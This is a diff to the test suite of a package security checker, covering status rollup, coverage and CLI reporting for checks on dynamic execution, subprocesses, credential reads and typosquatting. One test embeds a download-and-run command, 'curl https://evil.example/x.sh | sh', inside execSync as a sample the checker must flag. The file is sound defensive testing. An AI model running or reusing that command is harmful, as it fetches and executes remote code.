@@ -261,28 +261,81 @@ test('runSecurityChecks: every id is present and a missing manifest is not-run',
     assert.equal(check.coverage, 'not-run')
   }
   const advisory = buildSecurityView(checks, 'ds-c')
-  assert.equal(advisory.status, 'warn', 'a mandatory check that did not run cannot claim advisory pass')
+  assert.equal(advisory.status, 'incomplete', 'a mandatory check that did not run cannot claim advisory pass')
   assert.equal(advisory.scope, 'advisory')
   const security = buildSecurityView(checks, 'security')
   assert.equal(security.status, 'incomplete')
 })
 
+/** A full eight-check security set: PASS/full unless overridden. */
+function securityRows(overrides = {}) {
+  return SECURITY_IDS.map(id => ({
+    id,
+    clause: id.replace('DSC', 'C'),
+    layer: 'L0',
+    result: 'PASS',
+    coverage: 'full',
+    reason: '',
+    details: [],
+    evidence: [],
+    advisory: ['DSC-18', 'DSC-19', 'DSC-20', 'DSC-22'].includes(id),
+    ...(overrides[id] ?? {}),
+  }))
+}
+
+test('buildSecurityView: pass only when all eight are PASS with full coverage', () => {
+  const pass = buildSecurityView(securityRows(), 'security')
+  assert.equal(pass.status, 'pass')
+  assert.deepEqual(pass.partial, [])
+  assert.deepEqual(pass.notRun, [])
+
+  const warn = buildSecurityView(securityRows({ 'DSC-21': { result: 'WARN', reason: 'typosquat' } }), 'security')
+  assert.equal(warn.status, 'warn')
+  assert.deepEqual(warn.warn, ['DSC-21'])
+
+  const partial = buildSecurityView(securityRows({
+    'DSC-16': { result: 'PASS', coverage: 'partial', reason: 'partial: imports outside the closure' },
+  }), 'security')
+  assert.equal(partial.status, 'warn', 'partial coverage must not claim pass')
+  assert.deepEqual(partial.partial, [{ id: 'DSC-16', reason: 'partial: imports outside the closure' }])
+
+  const notRun = buildSecurityView(securityRows({ 'DSC-22': { result: 'NA', coverage: 'not-run', reason: 'no metadata' } }), 'security')
+  assert.equal(notRun.status, 'incomplete')
+  assert.deepEqual(notRun.notRun, ['DSC-22'])
+
+  const fail = buildSecurityView(securityRows({
+    'DSC-16': { result: 'FAIL', details: [{ item: 'C-16.1', result: 'FAIL', reason: 'eval' }] },
+  }), 'security')
+  assert.equal(fail.status, 'fail')
+  assert.deepEqual(fail.blocking, ['DSC-16'])
+})
+
+test('buildSecurityView: a partial check without a reason still records one', () => {
+  const view = buildSecurityView(securityRows({
+    'DSC-21': { result: 'PASS', coverage: 'partial', reason: '', details: [{ item: 'C-21.3', result: 'NA', reason: 'registry metadata missing' }] },
+  }), 'security')
+  assert.deepEqual(view.partial, [{ id: 'DSC-21', reason: 'registry metadata missing' }])
+})
+
 test('buildSecurityView: non-security scope caps FAIL to WARN; security scope keeps it', () => {
-  const failed = {
-    id: 'DSC-16', clause: 'C-16', layer: 'L0', result: 'FAIL', coverage: 'full',
-    advisory: false, reason: 'dynamic execution', details: [{ item: 'C-16.1', result: 'FAIL', reason: 'eval' }], evidence: ['index.mjs:1'],
-  }
-  const advisory = buildSecurityView([failed], 'ds-c')
+  const failing = securityRows({
+    'DSC-16': {
+      result: 'FAIL', coverage: 'full',
+      reason: 'dynamic execution', details: [{ item: 'C-16.1', result: 'FAIL', reason: 'eval' }], evidence: ['index.mjs:1'],
+    },
+  })
+  const advisory = buildSecurityView(failing, 'ds-c')
   assert.equal(advisory.scope, 'advisory')
   assert.equal(advisory.status, 'warn')
   assert.deepEqual(advisory.blocking, [])
   assert.deepEqual(advisory.warn, ['DSC-16'])
-  assert.equal(advisory.checks[0].result, 'WARN')
-  assert.equal(advisory.checks[0].details[0].result, 'WARN')
-  const security = buildSecurityView([failed], 'security')
+  const capped = advisory.checks.find(item => item.id === 'DSC-16')
+  assert.equal(capped.result, 'WARN')
+  assert.equal(capped.details[0].result, 'WARN')
+  const security = buildSecurityView(failing, 'security')
   assert.equal(security.status, 'fail')
   assert.deepEqual(security.blocking, ['DSC-16'])
-  assert.equal(security.checks[0].result, 'FAIL')
+  assert.equal(security.checks.find(item => item.id === 'DSC-16').result, 'FAIL')
 })
 
 test('buildReport: the security block is present in every scope and never moves ds-c', () => {
@@ -308,7 +361,7 @@ test('buildReport: the security block is present in every scope and never moves 
   assert.equal(report.conclusion.status, 'pass')
   assert.equal(report.conclusion.exitCode, 0)
   assert.equal(report.security.scope, 'advisory')
-  assert.equal(report.security.status, 'warn')
+  assert.equal(report.security.status, 'incomplete', 'DSC-19/DSC-22 did not run, so the security block cannot claim pass')
   assert.deepEqual(report.security.blocking, [])
   assert.equal(report.security.checks.length, 8)
 })
@@ -338,13 +391,14 @@ test('CLI: --scope security includes all 22 checks and FAIL exits 1', () => {
   assert.deepEqual(run.report.security.blocking, ['DSC-15'])
 })
 
-test('CLI: a clean package passes security scope and a WARN-only package exits 0', () => {
+test('CLI: clean/WARN packages exit 0 but the security block never claims pass without all eight', () => {
   const clean = runCli(path.join(SECURITY_FIXTURES, 'sec16-declared'), ['--scope', 'security', '--no-exec'])
   assert.equal(clean.code, 0, clean.stderr)
-  assert.equal(clean.report.security.status, 'pass')
+  assert.equal(clean.report.security.status, 'incomplete', 'DSC-22 is not-run without registry metadata')
+  assert.deepEqual(clean.report.security.notRun, ['DSC-22'])
   const warn = runCli(path.join(SECURITY_FIXTURES, 'sec21-typosquat'), ['--scope', 'security', '--no-exec'])
   assert.equal(warn.code, 0, warn.stderr)
-  assert.equal(warn.report.security.status, 'warn')
+  assert.equal(warn.report.security.status, 'incomplete', 'WARN + not-run is incomplete, never pass')
   assert.deepEqual(warn.report.security.warn, ['DSC-21'])
 })
 
@@ -355,8 +409,10 @@ test('security block shape matches the conformance schema', () => {
   assert.deepEqual([...schema.$defs.security.required].sort(), ['advisory', 'blocking', 'checks', 'notRun', 'scope', 'status', 'warn'])
   assert.ok(schema.$defs.conclusion.properties.scope.enum.includes('security'))
   const run = runCli(path.join(SECURITY_FIXTURES, 'sec16-declared'), ['--scope', 'security', '--no-exec'])
+  assert.ok(schema.$defs.security.properties.partial, 'security.partial must be a known additive property')
   const security = run.report.security
   for (const key of schema.$defs.security.required) assert.ok(Object.hasOwn(security, key), `security is missing ${key}`)
+  assert.ok(Array.isArray(security.partial), 'security.partial is emitted even when empty')
 })
 
 test('DSC-19 inventory: a sourcemap comment keeps a long line advisory-free', () => {
@@ -402,7 +458,7 @@ test('DSC-16: download-and-run subprocess commands FAIL; plain subprocess and im
   for (const name of ['sec16-exec-curl', 'sec16-spawn-shell']) {
     const execution = securityOfFixture(name).get('DSC-16')
     assert.equal(execution.result, 'FAIL', name)
-    assert.ok(execution.details.some(item => item.item === 'C-16.1' && /remote script piped to a shell/.test(item.reason)), JSON.stringify(execution.details))
+    assert.ok(execution.details.some(item => item.item === 'C-16.3' && item.result === 'FAIL' && /remote script piped to a shell/.test(item.reason)), JSON.stringify(execution.details))
   }
   for (const name of ['sec16-subprocess-safe', 'sec16-import-only']) {
     assert.equal(securityOfFixture(name).get('DSC-16').result, 'WARN', name)
@@ -447,4 +503,116 @@ test('CLI: healed credential, command and install fixtures are blocking in secur
   }
   const clean = runCli(path.join(SECURITY_FIXTURES, 'sec17-alias-clean'), ['--scope', 'security', '--no-exec'])
   assert.equal(clean.code, 0, clean.stderr)
+})
+
+test('C-16.3: dangerous exec/spawn is a subprocess finding, not C-16.1', () => {
+  const securityChecks = runSecurityChecks({
+    dir: null,
+    manifest: { name: 'x', version: '1.0.0' },
+    sources: [{ relative: 'index.mjs', text: "import { execSync } from 'node:child_process'\nexport function run() { return execSync('curl https://evil.example/x.sh | sh') }\n" }],
+    entry: { relative: 'index.mjs' },
+    kind: 'plugin',
+  })
+  const dsc16 = securityChecks.find(item => item.id === 'DSC-16')
+  assert.equal(dsc16.result, 'FAIL')
+  assert.ok(dsc16.details.some(item => item.item === 'C-16.3' && item.result === 'FAIL'), JSON.stringify(dsc16.details))
+  assert.ok(!dsc16.details.some(item => item.item === 'C-16.1' && /execSync/.test(item.reason)))
+})
+
+test('C-16.3: advice never upgrades a WARN-only subprocess detail to FAIL', () => {
+  const securityChecks = runSecurityChecks({
+    dir: null,
+    manifest: { name: 'x', version: '1.0.0' },
+    sources: [{ relative: 'index.mjs', text: "import { readFileSync } from 'node:fs'\nimport { execFileSync } from 'node:child_process'\nexport function apply() { eval('1'); return execFileSync('git', ['status']) }\n" }],
+    entry: { relative: 'index.mjs' },
+    kind: 'plugin',
+  })
+  const dsc16 = securityChecks.find(item => item.id === 'DSC-16')
+  assert.equal(dsc16.result, 'FAIL')
+  assert.ok(dsc16.details.some(item => item.item === 'C-16.3' && item.result === 'WARN'), JSON.stringify(dsc16.details))
+  const report = buildReport({
+    subject: { mode: 'package', profile: 'package', kind: 'plugin', kindInferred: false, name: 'x', version: '1.0.0', path: HERE },
+    anchor: ANCHOR,
+    checks: securityChecks,
+    scope: 'security',
+    profile: 'package',
+    kind: 'plugin',
+    securityChecks,
+  })
+  const advice = new Map(report.advice.map(item => [item.key, item]))
+  assert.equal(advice.get('C-16.1').gate, 'FAIL')
+  assert.equal(advice.get('C-16.3').gate, 'WARN', 'a WARN detail must not become FAIL advice')
+  assert.equal(advice.get('C-16.3').severity, 'WARN')
+  assert.match(advice.get('C-16.3').fix ?? '', /参数数组|白名单/)
+})
+
+test('C-17: a fully dynamic read/readdir argument is partial, never PASS/full', () => {
+  const read = securityOfSource("import fs from 'node:fs'\nexport function readIt(p) { return fs.readFileSync(p, 'utf8') }\n").get('DSC-17')
+  assert.equal(read.result, 'PASS')
+  assert.equal(read.coverage, 'partial')
+  assert.match(read.reason, /dynamic/)
+  assert.ok(read.details.some(item => item.item === 'C-17.4' && item.result === 'NA'), JSON.stringify(read.details))
+
+  const list = securityOfSource("import fs from 'node:fs'\nexport function list(dir) { return fs.readdirSync(dir) }\n").get('DSC-17')
+  assert.equal(list.result, 'PASS')
+  assert.equal(list.coverage, 'partial')
+  assert.match(list.reason, /dynamic/)
+
+  const literal = securityOfSource("import fs from 'node:fs'\nexport function readData() { return fs.readFileSync('./data.txt', 'utf8') }\n").get('DSC-17')
+  assert.equal(literal.result, 'PASS')
+  assert.equal(literal.coverage, 'full')
+})
+
+test('C-21: devDependencies are scanned and C-21.3 lists the declared names', () => {
+  const dev = runSecurityChecks({
+    dir: null,
+    manifest: { name: 'x', version: '1.0.0', devDependencies: { 'dsh-fsx': '1.0.0' } },
+    sources: [],
+  }).find(item => item.id === 'DSC-21')
+  assert.equal(dev.result, 'WARN')
+  assert.ok(dev.details.some(item => item.item === 'C-21.1' && /dsh-fsx/.test(item.reason)), JSON.stringify(dev.details))
+  const meta = dev.details.find(item => item.item === 'C-21.3')
+  assert.ok(meta)
+  assert.match(meta.reason, /dsh-fsx/)
+
+  const known = runSecurityChecks({
+    dir: null,
+    manifest: { name: 'x', version: '1.0.0', devDependencies: { 'dsh-fs': '1.0.0' } },
+    sources: [],
+  }).find(item => item.id === 'DSC-21')
+  assert.equal(known.result, 'PASS')
+  assert.equal(known.coverage, 'partial')
+  assert.match(known.details.find(item => item.item === 'C-21.3').reason, /dsh-fs/)
+})
+
+test('CLI: --help lists 15/16/17 as blocking and C-21 as WARN-only', () => {
+  const run = spawnSync(process.execPath, [CHECKER, '--help'], { encoding: 'utf8' })
+  assert.equal(run.status, 0, run.stderr)
+  assert.match(run.stdout, /DSC-15\/16\/17 are blocking/)
+  assert.match(run.stdout, /DSC-21 is WARN-only/)
+  assert.doesNotMatch(run.stdout, /DSC-15\/16\/17\/21 are blocking/)
+})
+
+test('CLI: --scope security keeps a non-security FAIL out of buckets.blocking and the headline', () => {
+  const run = runCli(path.join(HERE, '..', 'fixtures', 'good'), ['--runtime-version', '0.2.1-rc.5', '--scope', 'security', '--no-exec'])
+  assert.equal(run.code, 0, run.stderr)
+  assert.equal(run.report.conclusion.status, 'pass')
+  assert.deepEqual(run.report.buckets.blocking, [])
+  assert.match(run.report.conclusion.headline, /blocking 0/)
+  const dsc02 = run.report.buckets.hygiene.find(row => row.id === 'DSC-02')
+  assert.ok(dsc02, 'DSC-02 must stay visible as a non-blocking hygiene row')
+  assert.equal(dsc02.result, 'WARN')
+  assert.match(dsc02.reason, /not blocking in --scope security/)
+})
+
+test('CLI: --scope security fail and headline are driven by DSC-15/16/17', () => {
+  for (const [name, id] of [['sec16-exec-curl', 'DSC-16'], ['sec15-pipe', 'DSC-15'], ['sec17-cred-exfil', 'DSC-17']]) {
+    const run = runCli(path.join(SECURITY_FIXTURES, name), ['--scope', 'security', '--no-exec'])
+    assert.equal(run.code, 1, `${name}: ${run.stderr}`)
+    assert.equal(run.report.conclusion.status, 'fail', name)
+    assert.equal(run.report.security.status, 'fail', name)
+    assert.deepEqual(run.report.buckets.blocking.map(row => row.id), [id], name)
+    assert.equal(run.report.buckets.blocking[0].result, 'FAIL')
+    assert.match(run.report.conclusion.headline, /blocking 1/, name)
+  }
 })
